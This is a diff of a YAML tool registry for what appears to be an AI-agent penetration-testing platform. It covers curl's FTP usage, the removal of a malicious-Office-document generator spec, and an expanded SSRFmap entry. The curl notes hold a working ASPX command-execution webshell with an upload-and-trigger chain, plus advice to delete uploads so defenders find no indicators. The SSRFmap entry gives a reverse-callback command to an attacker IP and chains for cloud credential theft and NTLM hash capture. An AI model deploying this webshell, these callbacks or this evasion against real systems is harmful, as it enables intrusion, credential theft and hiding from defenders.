+        idiomatic curl FTP-command path — sends a raw FTP command before the implicit operation. The trailing URL is just
+        the connection target (root or any dir); the DELE command targets the path directly. Alternative `-X DELE` works but
+        curl emits a cosmetic ''RETR response: 250'' warning after — `--quote` doesn''t. Same pattern works for MKD (mkdir),
+        RMD (rmdir), RNFR+RNTO (rename), CHMOD (when server supports SITE CHMOD).'
+    output_formats:
+    - flag: ''
+      format: text
+      preferred: true
+      notes: curl writes FTP response data (file content for RETR, listing for LIST) to stdout. Protocol trace via -v goes
+        to stderr (use `2>&1` or `2>logfile` to capture). For binary downloads via -o, stdout is empty (the bytes go to the
+        file).
+    common_options:
+      auth:
+      - -u user:pass (or -u user) — username + optional password; curl prompts for password if only user given; -u with no
+        flag uses anonymous (per RFC 1738)
+      - -n / --netrc — read credentials from ~/.netrc (rare in agent flow)
+      protocol:
+      - ftp://host/path — plain FTP (port 21 default)
+      - ftps://host/path — implicit FTPS (port 990 default)
+      - ftp://host/path + --ssl-reqd — explicit FTPS (AUTH TLS on port 21)
+      - -k / --insecure — skip TLS cert verification (engagement targets often have self-signed)
+      transfer:
+      - -T LOCAL ftp://host/dir/ — upload LOCAL to remote dir (filename kept)
+      - -T LOCAL ftp://host/dir/remote-name — upload LOCAL as remote-name
+      - -o LOCAL ftp://host/path — download path to LOCAL (binary-safe)
+      - -O ftp://host/path — download keeping the remote filename
+      - --upload-file LOCAL — alias for -T
+      ftp_commands:
+      - --quote 'COMMAND' — send raw FTP command BEFORE the implicit operation (DELE, MKD, RMD, RNFR, RNTO, SITE CHMOD)
+      - --quote-after 'COMMAND' — send raw FTP command AFTER the implicit operation
+      - -X COMMAND — replace the implicit FTP command (e.g., -X DELE is similar but emits cosmetic warnings)
+      mode:
+      - default — passive mode (PASV); usually right for firewalled networks
+      - -P - / --ftp-port - — active mode; curl tells server to connect back to client (rare, often blocked by NAT)
+      - --ftp-pasv — explicitly request passive (default anyway)
+      output:
+      - -sS — silent except errors (recommended for parseable output)
+      - -v — verbose protocol trace to stderr (FTP exchange visible, useful for F1 banner)
+      - --max-time SECONDS — overall timeout (recommend 10s for probes, 60s for transfers, 600s for multi-GB downloads)
+      - --connect-timeout SECONDS — TCP connect timeout (separate from data transfer)
+    gotchas:
+    - 'ANONYMOUS-BY-DEFAULT: `curl ftp://host/` without `-u` uses RFC-1738 anonymous auth (username=anonymous, password=ftp@example.com).
+      This is the FASTEST anonymous probe — one call, no manual creds. Tested live 2026-05-17 against pyftpdlib with add_anonymous:
+      directory listing returned correctly.'
+    - 'TRAILING SLASH ON DIRECTORY URLs: `curl ftp://host/pub/` (with slash) lists the directory; `curl ftp://host/pub` (no
+      slash) treats /pub as a FILE and tries RETR. Same for uploads: `curl -T file ftp://host/dir/` keeps the local filename;
+      `curl -T file ftp://host/dir/remote-name` renames. Easy to forget; agent must mind the slash.'
+    - 'PASSIVE vs ACTIVE MODE: curl defaults to PASSIVE (PASV) — right for most engagement targets, especially behind NAT.
+      ACTIVE (`-P -`) tells the FTP server to connect BACK to the client on a random port — usually blocked by attacker-side
+      firewall/NAT unless the agent has a publicly-reachable IP. Default is correct 99% of the time. If a target server rejects
+      PASV (''425 Failed to establish connection''), try active with `-P -` but expect NAT issues.'
+    - 'FTPS — IMPLICIT vs EXPLICIT: Implicit FTPS uses port 990 + TLS-from-start (URL `ftps://host:990/...`). Explicit FTPS
+      uses port 21 + STARTTLS-style AUTH TLS upgrade (URL `ftp://host:21/...` + flag `--ssl-reqd`). Most modern servers use
+      EXPLICIT (port 21). Agent: try `--ssl-reqd` on port 21 first; if 64 ''Requested SSL level failed'', server doesn''t
+      support TLS — fall back to plain FTP.'
+    - 'SELF-SIGNED FTPS CERTS: add `-k` (or `--insecure`) to skip TLS cert verification. Engagement targets routinely have
+      self-signed certs; legacy wrapper auto-disabled verification. With -k, curl still validates the protocol/cert format
+      but accepts any chain/hostname.'
+    - 'BINARY DOWNLOADS: Pattern F3 with `-o /session/output/ftp/<name>` writes binary-safe (no UTF-8 mangling). For BASE64
+      encoding (when agent wants the bytes inline), run as a second step: `base64 -w0 /session/output/ftp/<name>`. The legacy
+      wrapper auto-base64''d everything; kind:cli separates the steps so agent can use the file path directly when appropriate.'
+    - '50KB TEXT TRUNCATION (legacy wrapper had it): the kind:mcp wrapper capped `content_text` at 50000 chars. kind:cli doesn''t
+      auto-truncate — `cat /session/output/ftp/<name>` returns the full file. For very large text files, agent does `head
+      -c 50000 /session/output/ftp/<name>` explicitly or uses Read tool with offset+limit.'
+    - 'DELETE / FTP COMMANDS via --quote: `curl --quote ''DELE /path'' ftp://host/` is the IDIOMATIC FTP-cmd path (clean exit
+      0). The alternative `-X DELE` works but curl emits a cosmetic ''RETR response: 250'' warning after — `--quote` doesn''t.
+      Same `--quote` pattern works for MKD (mkdir), RMD (rmdir), RNFR + RNTO (rename — 2 commands), SITE CHMOD (when server
+      supports). The URL after `--quote` is just the connection target (root or any directory).'
+    - 'VERBOSE BANNER FOR WELCOME LINE: pattern F1 uses `curl -sSv ftp://host/ 2>&1 | grep ''^< 220''`. The 220 line is the
+      server''s welcome banner — typically `220 (vsFTPd 3.0.3)` or `220 ProFTPD 1.3.5 Server`. This is the FTP-software-fingerprint
+      version that drives searchsploit lookups. Without -v, curl hides the protocol trace.'
+    - 'REJECT NON-FTP-MODE FTP SERVERS via -v exit codes: curl returns specific exit codes for FTP failures — 9 = path/CWD
+      denied (file or dir doesn''t exist OR no read perm), 64 = SSL level failed (server doesn''t support FTPS), 67 = auth
+      failed (530 Login incorrect), 78 = remote file not found (RETR target missing). Agent maps these to specific remediations
+      via failure_signatures.'
+    - 'DOWNLOADED-FROM-FTP DB FILES: Pattern F3 followed by sqlite extraction is a common chain. The `.db` / `.sqlite` lands
+      at /session/output/ftp/<name>; then Pattern S1 of the `sqlite` tool (kind:cli v3.46) lists tables: `sqlite3 -json -readonly
+      /session/output/ftp/<name> ''SELECT name FROM sqlite_master WHERE type="table" AND name NOT LIKE "sqlite_%";''`. Most
+      CMS-with-SQLite setups (WP-SQLite, Drupal-SQLite) have credential tables exposed this way.'
+    - 'IIS ANONYMOUS-WRITE → ASPX WEBSHELL CHAIN: on Windows IIS targets (HTB Devel style), anonymous FTP often has write
+      access to C:\inetpub\wwwroot\. Upload an ASPX shell via Pattern F4: agent stages cmd.aspx via Write tool (or heredoc
+      inside Pattern F4-prep) → curl -T → trigger via `curl http://host/cmd.aspx?c=whoami`. IMPORTANT (verified live 2026-05-17
+      on HTB Devel IIS 7.5): use the `<script runat="server">` form, NOT the inline `<% %>` one-liner — IIS 7.5 rejects the
+      inline form with a generic ''Runtime Error'' page. Working ASPX template: `<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics"
+      %><script runat="server">void Page_Load(object sender, EventArgs e){ string cmd = Request["c"]; if (cmd == null){Response.Write("c=?");return;}
+      Process p = new Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + cmd; p.StartInfo.UseShellExecute
+      = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd());}</script>`.
+      Live-verified RCE: `whoami` → `iis apppool\web`.'
+    - 'NMAP-FIRST WORKFLOW: agent should run `nmap -sV -p 21 <host>` BEFORE this tool''s F0/F1 to confirm: (a) port 21 actually
+      open, (b) what software (vsftpd vs ProFTPD vs Pure-FTPd vs custom), (c) banner version for CVE lookup. Skip if engagement
+      already established this; otherwise it''s free recon.'
+    - 'OPERATIONAL HYGIENE: Pattern F5 deletes uploaded webshells/exploits AFTER use. Skipping cleanup leaves IOCs for defenders
+      (and graders in CTFs/HTB). For engagement traces: keep your /session/output/ftp/ artifacts (those are agent-side records),
+      delete the TARGET-side uploads.'
+    failure_signatures:
+    - signal: 'curl: (7) Failed to connect'
+      layer: tcp
+      remediation: Port 21 immediately refused / no route to host (curl got ECONNREFUSED or EHOSTUNREACH on TCP connect).
+        Check (1) host is up — `ping host` or `nc -zv host 21`, (2) port not blocked by firewall as REJECT, (3) FTP service
+        actually running — nmap -p 21 -sV. Distinct from (28) which is timeout (firewall DROP, no response).
+    - signal: 'curl: (28) Connection timed out'
+      layer: tcp
+      remediation: TCP SYN sent but no SYN-ACK within --max-time / --connect-timeout (curl got CURLE_OPERATION_TIMEDOUT).
+        Common when target firewall DROPs packets rather than REJECTing (no ICMP unreachable). Check (1) tun0 is actually
+        routing to target — `ping host`, (2) increase --max-time if RTT is high (HTB tun0 can be 200-400ms vs 10ms local),
+        (3) verify via nmap -Pn -p 21 (skip ping if ICMP is also blocked). Distinct from (7) which is immediate refusal.
+    - signal: 'curl: (9) Server denied you to change to the given directory'
+      layer: auth
+      remediation: Either the path doesn't exist OR the authenticated user lacks read perm on that directory. Try (1) F2 list
+        parent dir first to see what's actually there, (2) check user's group permissions via F2 on root /, (3) try anonymous
+        if currently using authenticated creds (some servers restrict authenticated users more than anonymous!).
+    - signal: 'curl: (64) Requested SSL level failed'
+      layer: tls
+      remediation: 'Server doesn''t support TLS / FTPS on this port. If on port 21: server doesn''t support explicit FTPS
+        (no AUTH TLS) — drop `--ssl-reqd` and use plain FTP. If on port 990: server doesn''t support implicit FTPS at all
+        — try plain FTP on 21 instead. Some legacy servers reject TLS handshakes entirely; nmap --script ftp-anon will reveal.'
+    - signal: 'curl: (67) Access denied: 530'
+      layer: auth
+      remediation: Authentication failed (530 Login incorrect). Either credentials wrong (try hydra ftp://host for brute-force),
+        anonymous disabled (try discovered creds), or account locked. Some servers return 530 for ALL failed auth — log a
+        successful login attempt via F0 with no -u to differentiate anonymous-disabled vs invalid-creds.
+    - signal: 'curl: (78) RETR response: 550'
+      layer: fs
+      remediation: 550 means remote file/dir not found OR no read perm. Check path spelling + case. Use F2 to list parent
+        dir and see exact names. Pure-FTPd is case-sensitive by default; vsftpd is OS-dependent.
+    - signal: 'curl: (19) RETR response: 250'
+      layer: fs
+      remediation: Cosmetic warning when using -X to inject a non-default FTP command (like DELE). The injected command succeeded
+        (250 = OK) but curl wanted to also issue a follow-up that didn't happen. Switch to `--quote 'COMMAND'` pattern to
+        avoid this warning entirely. The DELE itself worked — verify via F2 list of the parent dir.
+    help_commands:
+    - name: curl — FTP-relevant help section
+      binary: curl
+      command: --help ftp
+      when: Print curl's FTP-specific flags (--ftp-account, --ftp-create-dirs, --ftp-pasv, --ftp-port, --ftp-skip-pasv-ip,
+        --ftp-ssl-*, --no-epsv, --no-eprt). target=null.
+    - name: curl — version + protocol list (confirms FTP/FTPS support)
+      binary: curl
+      command: --version
+      when: Show curl version + supported protocols. FTP/FTPS are in the protocols line. target=null.
+    - name: curl — verbose FTP exchange for one-shot debugging
+      binary: curl
+      command: -sSv ftp://example.com/ 2>&1
+      when: When an FTP recipe fails unexpectedly, run with -v against the same target to see the FTP protocol trace (USER/PASS/PWD/LIST
+        commands + server responses with 3-digit codes). target=null.
   git-dumper:
     name: git-dumper
     kind: cli
@@ -14695,379 +14860,6 @@ tools:
       purpose: List all loaded templates (combine with -tags / -severity to preview the scope before running a real scan)
     - command: nuclei -tl -tags cve
       purpose: List templates for a specific tag — useful when planning a scoped scan
-  office-exploit:
-    name: office-exploit
-    version: '1.0'
-    description: 'Create malicious Microsoft Office documents (XLSX, DOCX, PPTX) with embedded XSS, XXE, SSRF, formula injection,
-      and template injection payloads for authorized security testing. 6 methods: create_xlsx (XSS via sheet names, XXE in
-      6 XML targets, formula injection, external links for SSRF), create_docx (XXE, external image SSRF, Follina-style template
-      injection), create_pptx (XXE, external media SSRF, hover/click action links), modify_office_xml (low-level XML editing
-      via xpath), extract_office_xml (inspect XML internals), list_payloads (show available templates). All outputs include
-      base64-encoded file content for immediate delivery. No macros — for VBA macro payloads, use exploit-runner with a msfvenom-via-script
-      wrapper.'
-    image: ghcr.io/silicon-works/mcp-tools-office-exploit:latest
-    image_size_mb: 80
-    timeout_seconds: 300
-    capabilities:
-    - malicious_document_generation
-    - xxe_injection
-    - xss_injection
-    - ssrf_exploitation
-    - formula_injection
-    - template_injection
-    see_also:
-    - curl
-    - exploit-runner
-    routing:
-      use_for:
-      - create malicious Excel XLSX with XSS payload in sheet names for PHPSpreadsheet CVE-2025-22131
-      - create malicious Word DOCX with XXE payload to read server files or trigger SSRF
-      - create malicious PowerPoint PPTX with hover or click action link for code execution
-      - XXE injection via crafted Office document uploaded to web application
-      - SSRF via external image or link reference in Office document
-      - formula injection in Excel spreadsheet for CSV injection or data exfiltration
-      - Follina-style template injection in DOCX via ms-msdt protocol handler
-      - extract and inspect XML internals of Office documents for custom payload crafting
-      never_use_for:
-      - legitimate document creation
-      - document conversion
-      - reading Office files
-      - macro generation
-      triggers:
-      - malicious xlsx
-      - malicious docx
-      - malicious pptx
-      - xxe payload
-      - xss spreadsheet
-      - office exploit
-      - formula injection
-      prefer_over: []
-    warnings:
-    - Generated documents are for authorized security testing ONLY
-    - Macro payloads (XLSM/DOCM) not supported in v1 — wrap msfvenom in an exploit-runner script for VBA generation
-    - Output files must be within /session/ directory
-    phases:
-    - exploitation
-    requirements:
-      network: false
-      privileged: false
-    resources:
-      memory_mb: 128
-      cpu: 0.25
-    methods:
-      create_xlsx:
-        description: Create a malicious Excel file with XSS, XXE, formula injection, or external link payloads
-        when_to_use: When you need to exploit web applications that process XLSX files (PHPSpreadsheet, Apache POI, etc.)
-        params:
-          output_path:
-            type: string
-            required: true
-            description: Path to save the file (must be within /session/)
-          sheets:
-            type: array
-            required: true
-            description: 'Array of sheet definitions: [{name: string, data?: string[][]}]. Sheet names are NOT sanitized.'
-          payload_type:
-            type: enum
-            values:
-            - xss_sheetname
-            - xxe
-            - formula
-            - external_link
-            description: Type of payload to inject
-          xxe_style:
-            type: enum
-            values:
-            - oob_http
-            - oob_ftp
-            - file_read
-            - ssrf
-            default: oob_http
-            description: XXE injection style
-          xxe_target_xml:
-            type: enum
-            values:
-            - sharedStrings
-            - workbook
-            - sheet1
-            - styles
-            - contentTypes
-            - multi
-            default: sharedStrings
-            description: XML file to inject XXE into
-          xxe_callback_url:
-            type: string
-            description: Callback URL for OOB XXE
-          xxe_file_to_read:
-            type: string
-            description: File path for file_read XXE
-          formula:
-            type: string
-            description: Formula to inject in cell A1 (shortcut)
-          external_link_type:
-            type: enum
-            values:
-            - workbook_ref
-            - web_query
-            default: workbook_ref
-            description: Type of external link for SSRF
-          external_url:
-            type: string
-            description: External URL for SSRF payloads
-        returns:
-          path:
-            type: string
-            description: Path to generated file
-          size_bytes:
-            type: integer
-            description: File size in bytes
-          sha256:
-            type: string
-            description: SHA256 hash of file
-          payload_type:
-            type: string
-            description: Type of payload injected
-          injection_locations:
-            type: array
-            description: XML files modified
-          content_base64:
-            type: string
-            description: Base64-encoded file content for immediate use
-      create_docx:
-        description: Create a malicious Word file with XXE, external image, or template injection payloads
-        when_to_use: When you need to exploit applications that process DOCX files or need SSRF via document
-        params:
-          output_path:
-            type: string
-            required: true
-            description: Path to save the file (must be within /session/)
-          content:
-            type: string
-            description: Document text content
-          payload_type:
-            type: enum
-            values:
-            - xxe
-            - external_image
-            - template_injection
-            description: Type of payload to inject
-          xxe_style:
-            type: enum
-            values:
-            - oob_http
-            - oob_ftp
-            - file_read
-            - ssrf
-            default: oob_http
-            description: XXE injection style
-          xxe_target_xml:
-            type: enum
-            values:
-            - document
-            - settings
-            - styles
-            - fontTable
-            - webSettings
-            - multi
-            default: document
-            description: XML file to inject XXE into
-          xxe_callback_url:
-            type: string
-            description: Callback URL for OOB XXE
-          xxe_file_to_read:
-            type: string
-            description: File path for file_read XXE
-          external_url:
-            type: string
-            description: External URL for image/template SSRF
-          template_type:
-            type: enum
-            values:
-            - remote
-            - msdt
-            default: remote
-            description: Template injection type (msdt = Follina-style)
-          template_url:
-            type: string
-            description: URL for remote template
-        returns:
-          path:
-            type: string
-            description: Path to generated file
-          size_bytes:
-            type: integer
-            description: File size in bytes
-          sha256:
-            type: string
-            description: SHA256 hash of file
-          payload_type:
-            type: string
-            description: Type of payload injected
-          injection_locations:
-            type: array
-            description: XML files modified
-          content_base64:
-            type: string
-            description: Base64-encoded file content
-      create_pptx:
-        description: Create a malicious PowerPoint file with XXE, external media, or action link payloads
-        when_to_use: When you need to exploit applications that process PPTX files or need hover/click-triggered attacks
-        params:
-          output_path:
-            type: string
-            required: true
-            description: Path to save the file (must be within /session/)
-          payload_type:
-            type: enum
-            values:
-            - xxe
-            - external_media
-            - action_link
-            description: Type of payload to inject
-          xxe_style:
-            type: enum
-            values:
-            - oob_http
-            - oob_ftp
-            - file_read
-            - ssrf
-            default: oob_http
-            description: XXE injection style
-          xxe_target_xml:
-            type: enum
-            values:
-            - presentation
-            - slide1
-            - slideLayout
-            - slideMaster
-            - multi
-            default: presentation
-            description: XML file to inject XXE into
-          xxe_callback_url:
-            type: string
-            description: Callback URL for OOB XXE
-          xxe_file_to_read:
-            type: string
-            description: File path for file_read XXE
-          external_url:
-            type: string
-            description: External URL for media SSRF
-          trigger:
-            type: enum
-            values:
-            - hover
-            - click
-            default: hover
-            description: Action link trigger
-          action:
-            type: enum
-            values:
-            - hyperlink
-            - program
-            default: hyperlink
-            description: Action type
-          action_target:
-            type: string
-            description: Target URL or program path
-        returns:
-          path:
-            type: string
-            description: Path to generated file
-          size_bytes:
-            type: integer
-            description: File size in bytes
-          sha256:
-            type: string
-            description: SHA256 hash of file
-          payload_type:
-            type: string
-            description: Type of payload injected
-          injection_locations:
-            type: array
-            description: XML files modified
-          content_base64:
-            type: string
-            description: Base64-encoded file content
-      modify_office_xml:
-        description: Low-level XML manipulation for custom payloads not covered by create_* methods
-        when_to_use: When pre-built payloads don't fit your needs and you need fine-grained control over Office XML
-        params:
-          input_path:
-            type: string
-            required: true
-            description: Path to existing Office file
-          output_path:
-            type: string
-            required: true
-            description: Path to save modified file
-          xml_file:
-            type: string
-            required: true
-            description: XML file within archive (e.g., 'xl/workbook.xml')
-          modifications:
-            type: array
-            required: true
-            description: 'Array of modifications: [{xpath, action, content}]'
-        returns:
-          path:
-            type: string
-            description: Path to modified file
-          size_bytes:
-            type: integer
-            description: File size in bytes
-          sha256:
-            type: string
-            description: SHA256 hash of file
-          injection_locations:
-            type: array
-            description: XML files modified
-          content_base64:
-            type: string
-            description: Base64-encoded file content
-      extract_office_xml:
-        description: Extract and inspect XML files from Office documents
-        when_to_use: To analyze existing Office files before crafting custom payloads
-        params:
-          input_path:
-            type: string
-            required: true
-            description: Path to Office file
-          xml_file:
-            type: string
-            description: Specific XML file to extract (omit to list all files)
-        returns:
-          file:
-            type: string
-            description: Extracted file path (when xml_file specified)
-          content:
-            type: string
-            description: XML content (when xml_file specified)
-          files:
-            type: array
-            description: List of files in archive (when xml_file omitted)
-      list_payloads:
-        description: List available payload templates and examples
-        when_to_use: To discover what payload types are available before generating documents
-        params:
-          file_type:
-            type: enum
-            values:
-            - xlsx
-            - docx
-            - pptx
-            description: Filter by file type
-          category:
-            type: enum
-            values:
-            - xss
-            - xxe
-            - ssrf
-            - formula
-            description: Filter by attack category
-        returns:
-          payloads:
-            type: object
-            description: Available payloads organized by file type and category
   pacu:
     name: pacu
     version: '1.7'
@@ -21823,20 +21615,32 @@ tools:
       purpose: 'sshpass usage. Five flags: -p (password), -f (file), -d (FD), -e (SSHPASS env), -v (verbose).'
   ssrfmap:
     name: ssrfmap
-    version: '1.0'
-    description: 'SSRF exploitation framework via SSRFmap — 3 methods: scan (test parameter for SSRF using 12 modules: readfiles,
-      portscan, networkscan, redis, mysql, fastcgi, memcache, smtp, tomcat, axfr, github, custom), exploit_metadata (extract
-      cloud instance metadata from AWS/GCE/Azure/DigitalOcean/Alibaba via SSRF to 169.254.169.254), generate_gopher (create
-      gopher:// protocol payloads for attacking Redis, MySQL, FastCGI, Memcached, SMTP, PostgreSQL, Zabbix through SSRF).
-      Supports WAF bypass levels 1-5. For basic HTTP requests use curl. For web vulnerability scanning use nuclei.'
+    kind: cli
+    binary: bash
+    version: swisskyrepo-master
+    description: 'SSRF exploitation framework via swisskyrepo/SSRFmap CLI (24 module files / 23 usable exploit modules + 1
+      skeleton template: readfiles + cloud-metadata per-provider (aws/gce/azure/digitalocean/alibaba) + portscan/networkscan
+      + gopher-encoded backend services (redis/mysql/fastcgi/memcache/postgres/smtp/zabbix) + tomcat manager + github enterprise
+      + axfr DNS zone transfer + smbhash UNC NTLM coercion + consul KV + docker socket + socksproxy + custom). Migrated kind:mcp
+      → kind:cli May 2026 (daemon-wrapper retirement series, Tier A; 597-LOC Python `requests` re-implementation wrapper that
+      never invoked the real SSRFmap collapsed to 22-LOC RunCliServer stub — kind:cli flip exposes the FULL 23-module surface
+      vs wrapper''s 2 effectively-implemented modules). Diff-based extraction: SSRFmap sends a baseline request first, then
+      diffs each SSRF response against it, writing the diff to /opt/ssrfmap/<host_or_host_port>/ — recipes auto-cp to /session/output/ssrfmap/.
+      For simple HTTP-only SSRF probes (one-shot file:// or one cloud-metadata URL with full response capture), curl can be
+      faster + more transparent; use ssrfmap for: (a) automated module-driven iteration, (b) gopher-encoded binary-protocol
+      exploitation, (c) -l http reverse-shell handler, (d) WAF-bypass payload variants (IP-encoding only — see gotcha for
+      case-variant gap).'
     image: ghcr.io/silicon-works/mcp-tools-ssrfmap:latest
-    image_size_mb: 300
-    timeout_seconds: 300
+    image_size_mb: 362
+    idle_timeout_seconds: 300
+    max_runtime_seconds: 600
+    timeout_seconds: 600
     capabilities:
     - ssrf_exploitation
     - cloud_metadata_extraction
     - gopher_payload_generation
     - backend_service_rce
+    - smb_hash_coercion
     phases:
     - exploitation
     requirements:
@@ -21847,16 +21651,25 @@ tools:
       cpu: 0.5
     routing:
       use_for:
-      - exploit SSRF vulnerability to read internal files or access internal services
-      - extract AWS/GCE/Azure cloud instance metadata credentials via SSRF
-      - attack backend services (Redis, MySQL, FastCGI, Memcached) through SSRF
-      - generate gopher:// protocol payloads for SSRF exploitation
-      - port scan internal network through SSRF
-      - bypass WAF protections on SSRF endpoints with multiple encoding levels
+      - exploit SSRF vulnerability — automated module-driven iteration through readfiles / portscan / cloud-metadata / gopher
+        chains
+      - extract AWS/GCE/Azure/DigitalOcean/Alibaba cloud instance metadata via SSRF (per-provider aws/gce/azure/digitalocean/alibaba
+        modules)
+      - attack backend services through SSRF using gopher-encoded payloads (Redis CONFIG SET webshell drop, MySQL UDF, FastCGI
+        RCE, Memcached injection, Postgres COPY FROM PROGRAM)
+      - port scan internal network through SSRF (portscan / networkscan modules)
+      - bypass WAF protections via --level 1-5 (decimal IP, hex IP, @-bypass, double-URL-encoding)
+      - SSRF-driven NTLM hash capture via UNC injection (smbhash module — pairs with responder for hash collection)
+      - Docker socket exploitation via SSRF (docker module)
+      - DNS AXFR zone transfer via SSRF (axfr module)
+      - Consul / Tomcat / GitHub Enterprise specific endpoints via SSRF (consul / tomcat / github modules)
       never_use_for:
-      - basic HTTP requests (use curl)
-      - web vulnerability scanning (use nuclei)
-      - 'direct service exploitation without SSRF (use dedicated tools: redis via netcat, mysql via mysql tool)'
+      - basic one-shot HTTP request through SSRF (use curl directly — faster and shows the response body inline)
+      - non-SSRF web vulnerability scanning (use nuclei)
+      - direct service exploitation without SSRF — for direct Redis access use netcat with raw protocol, for direct MySQL
+        use the mysql tool
+      - SSRF DETECTION (finding whether a parameter is SSRF-vulnerable in the first place) — use nuclei with SSRF templates
+        first; ssrfmap is for EXPLOITATION after detection
       triggers:
       - SSRF
       - server-side request forgery
@@ -21865,113 +21678,304 @@ tools:
       - 169.254.169.254
       - instance metadata
       - gopher payload
-      - internal service access
+      - internal service access through SSRF
+      - AWS credentials via SSRF
+      - Redis exploit via SSRF
+      - MySQL exploit via SSRF
+      - NTLM hash via SSRF
+      - Tomcat manager SSRF
       prefer_over: []
     see_also:
     - tool: curl
-      reason: Use curl for manual SSRF testing with specific URLs. Use ssrfmap for automated exploitation with modules and
-        WAF bypass.
+      reason: 'Use `curl` for one-shot manual SSRF testing where you need to SEE the response body inline (curl returns the
+        body; ssrfmap captures via diff-to-disk). After ssrfmap discovers which payload works, agent often re-runs the SAME
+        payload via curl to capture and inspect the response body manually. Two-tool workflow: ssrfmap for module-driven iteration
+        + WAF bypass variants; curl for response inspection.'
     - tool: nuclei
-      reason: Use nuclei for SSRF detection (has SSRF templates). Use ssrfmap for exploitation after confirming SSRF.
+      reason: Use `nuclei -t ssrf/` to DETECT SSRF vulnerabilities first (nuclei has 100+ SSRF templates). Once a parameter
+        is confirmed SSRF-vulnerable, escalate to `ssrfmap` for exploitation. nuclei = detection, ssrfmap = exploitation.
+    - tool: nc
+      reason: 'Pair with `nc` v2.0 held-listener pattern for SSRFmap''s reverse-conn modules: agent starts an nc listener
+        on tun0:PORT first, then runs `ssrfmap -m redis --lhost ATTACKER_TUN0_IP --lport PORT -l PORT` so the gopher-encoded
+        Redis CONFIG SET payload calls back to the listener (alternatively, `-l PORT` starts SSRFmap''s INTERNAL handler —
+        use nc when external listener is preferred, e.g. for multi-callback debugging).'
+    - tool: responder
+      reason: 'Pair with `responder` for `-m smbhash` UNC NTLM hash capture: agent starts responder on attacker tun0 first
+        (Pattern R3 SMB-only mode), then SSRFmap''s smbhash module triggers UNC `\\attacker_ip\share` injection via the SSRF
+        parameter; responder captures the NTLMv2 hash on the SMB port. Followed by hashcat 5600 (NetNTLMv2) for offline crack.'
     - tool: aws
-      reason: After extracting AWS credentials via ssrfmap exploit_metadata, use aws tool to enumerate and exploit the AWS
-        account.
-    methods:
-      scan:
-        description: 'Test a parameter for SSRF vulnerability using SSRFmap modules. Supports 12 modules: readfiles (read
-          local files), portscan (scan internal ports), networkscan (scan internal network), redis/mysql/fastcgi/memcache/smtp
-          (exploit backend services), tomcat (Tomcat manager), axfr (DNS zone transfer), github (GitHub Enterprise RCE).'
-        when_to_use: When a web parameter accepts URLs or file paths and might be used for server-side requests. Start with
-          readfiles module to confirm SSRF, then escalate to service-specific modules.
-        params:
-          url:
-            type: string
-            required: true
-            description: Target URL with the vulnerable parameter.
-          param:
-            type: string
-            required: true
-            description: Name of the SSRF-vulnerable parameter.
-          module:
-            type: string
-            default: readfiles
-            description: SSRFmap module to use.
-          level:
-            type: integer
-            default: 1
-            description: WAF bypass level (1-5).
-          lhost:
-            type: string
-            description: Attacker IP for reverse connections.
-          lport:
-            type: integer
-            description: Attacker port for reverse connections.
-          timeout:
-            type: integer
-            default: 60
-            description: Timeout in seconds.
-        returns: {}
-      exploit_metadata:
-        description: Extract cloud instance metadata via SSRF. Targets the cloud metadata endpoints (169.254.169.254 for AWS/Azure/DO,
-          metadata.google.internal for GCE) to steal IAM credentials, instance identity, and user data.
-        when_to_use: When SSRF is confirmed and target is a cloud instance (AWS EC2, GCE, Azure VM). AWS metadata is the most
-          valuable — steals temporary IAM credentials for account takeover.
-        params:
-          url:
-            type: string
-            required: true
-            description: Target URL with SSRF-vulnerable parameter.
-          param:
-            type: string
-            required: true
-            description: Vulnerable parameter name.
-          cloud:
-            type: string
-            default: aws
-            description: 'Cloud provider: aws, gce, azure, digitalocean, alibaba.'
-          level:
-            type: integer
-            default: 1
-            description: WAF bypass level (1-5).
-          timeout:
-            type: integer
-            default: 30
-            description: Timeout in seconds.
-        returns:
-          metadata_found:
-            type: boolean
-            description: Whether cloud metadata was successfully extracted.
-          credentials:
-            type: object
-            description: Extracted AWS credentials (AccessKeyId, SecretAccessKey, Token) if found.
-      generate_gopher:
-        description: Generate a gopher:// protocol payload for attacking backend services through SSRF. Gopher allows sending
-          raw TCP data, enabling exploitation of services that don't speak HTTP.
-        when_to_use: When SSRF supports the gopher:// protocol (many URL parsers do). Generate payloads for Redis RCE (webshell
-          via CONFIG SET), MySQL queries, FastCGI RCE, Memcached injection, SMTP relay.
-        params:
-          service:
-            type: string
-            required: true
-            description: 'Target backend service: redis, mysql, fastcgi, memcached, smtp, postgres, zabbix.'
-          command:
-            type: string
-            required: true
-            description: Command or query to execute on the backend service.
-          target_host:
-            type: string
-            default: 127.0.0.1
-            description: Backend service host.
-          target_port:
-            type: integer
-            description: Backend service port (auto-detected from service type if omitted).
-        returns:
-          payload:
-            type: string
-            description: The gopher:// URL payload to inject into the SSRF parameter.
-          usage:
-            type: string
-            description: Instructions on how to use the generated payload.
+      reason: 'After SSRFmap''s `aws` module extracts IAM credentials (written to /opt/ssrfmap/<host>_<port>/iam-* files),
+        feed to the `aws` tool (kind:cli vendor wrap of awslabs.aws-api-mcp-server) for full AWS enumeration: STS GetCallerIdentity,
+        IAM list policies, S3 enum, EC2 enum, etc.'
+    - tool: hash-lookup
+      reason: After ssrfmap's `smbhash` (via responder) captures NTLMv2, before spending hashcat cycles, check public pre-cracked
+        databases via `hash-lookup` (hashes.com, NIST).
+    target_extraction: []
+    target_extraction_reason: 'SSRFmap takes a request file (-r REQFILE) where the target is encoded inside the raw HTTP request''s
+      Host: header + URL. No top-level positional target arg suitable for extraction.'
+    reject_flags: []
+    reject_flags_reason: SSRFmap's argv shape is `-r REQFILE -p PARAM -m MODULE [...]` — no remote-target arg shape that needs
+      filtering.
+    usage_patterns:
+    - name: Pattern SM0 — write request file (prerequisite for all other patterns)
+      binary: bash
+      command: '-c ''mkdir -p /session/output/ssrfmap && cat > /session/output/ssrfmap/req.txt <<EOF
+
+        POST /<vulnerable_path> HTTP/1.1
+
+        Host: <target_host>:<port>
+
+        User-Agent: Mozilla/5.0
+
+        Content-Type: application/x-www-form-urlencoded
+
+        Cookie: <cookies-if-needed>
+
+        Content-Length: <length>
+
+
+        <param>=SSRFmap
+
+        EOF
+
+        echo written'''
+      when: 'Prerequisite for ALL SSRFmap module patterns. SSRFmap reads a raw HTTP request file via -r and replaces the value
+        of the parameter named in -p with the payload. Format: standard raw HTTP with \r\n line endings (heredoc handles this
